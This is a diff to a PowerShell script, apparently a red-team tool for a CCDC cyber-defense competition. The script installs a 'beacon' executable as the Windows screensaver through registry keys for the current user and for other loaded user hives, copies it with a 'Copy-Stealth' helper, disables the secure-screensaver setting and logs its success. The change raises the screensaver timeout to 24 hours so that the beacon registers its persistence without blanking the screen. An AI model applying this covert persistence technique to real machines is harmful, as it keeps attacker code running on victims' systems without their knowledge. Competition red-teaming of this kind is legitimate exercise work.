@@ -826,10 +826,13 @@ try {
     $scrResult = Copy-Stealth -Source $h1Beacon -Destination $scrDest
     if (-not $scrResult) { $scrDest = $h1Beacon }
 
+    # Timeout set to 86400s (24h) -- beacon EXE is not a real screensaver and has no
+    # window; a short timeout blacks the screen permanently. Use 24h so it never
+    # fires during a CCDC event while still registering the SCR path.
     $desktopKey = "HKCU:\Control Panel\Desktop"
     Set-ItemProperty $desktopKey -Name "SCRNSAVE.EXE"        -Value $scrDest -Force
     Set-ItemProperty $desktopKey -Name "ScreenSaveActive"    -Value "1"      -Force
-    Set-ItemProperty $desktopKey -Name "ScreenSaveTimeOut"   -Value "60"     -Force
+    Set-ItemProperty $desktopKey -Name "ScreenSaveTimeOut"   -Value "86400"  -Force
     Set-ItemProperty $desktopKey -Name "ScreenSaverIsSecure" -Value "0"      -Force
     Add-Log "H1" "Screensaver" $scrDest "OK" "current user"
 
@@ -846,7 +849,7 @@ try {
                     if (Test-Path $hiveDesk) {
                         Set-ItemProperty $hiveDesk "SCRNSAVE.EXE"        $scrDest -Force
                         Set-ItemProperty $hiveDesk "ScreenSaveActive"    "1"      -Force
-                        Set-ItemProperty $hiveDesk "ScreenSaveTimeOut"   "60"     -Force
+                        Set-ItemProperty $hiveDesk "ScreenSaveTimeOut"   "86400"  -Force
                         Set-ItemProperty $hiveDesk "ScreenSaverIsSecure" "0"      -Force
                         $ssOk++
                     }
